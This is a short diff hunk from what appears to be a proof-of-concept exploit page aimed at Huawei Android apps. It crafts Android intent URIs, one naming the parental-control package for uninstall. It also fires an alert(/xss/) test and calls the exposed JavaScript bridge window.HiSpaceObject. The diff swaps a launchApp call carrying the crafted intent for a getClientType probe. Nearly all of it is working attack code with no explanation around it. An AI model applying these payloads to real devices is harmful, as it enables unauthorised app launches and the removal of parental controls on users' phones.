@@ -13,7 +13,7 @@ var uri = "intent:#Intent;S.uninstall_packagename=com.huawei.parentcontrol;B.uni
 <!-- var uri="intent://com.huawei.hiaction/launchapp?url=/sdcard/test.htm#Intent;scheme=hiaction;package=com.huawei.hiaction;component=com.huawei.hiaction/com.huawei.hiaction.central.forward.RouterActivity;action=android.intent.action.VIEW;end"; -->
 <!-- var uri = "intent:#Intent;package=com.huawei.gamebox;component=com.huawei.gamebox/.GameBoxActivity;end"; -->
 alert(/xss/);
-window.HiSpaceObject.launchApp(null,uri);
+alert(window.HiSpaceObject.getClientType());
 var dataConfig = {
                 installStatus: 0,
                 isHuawei: true,
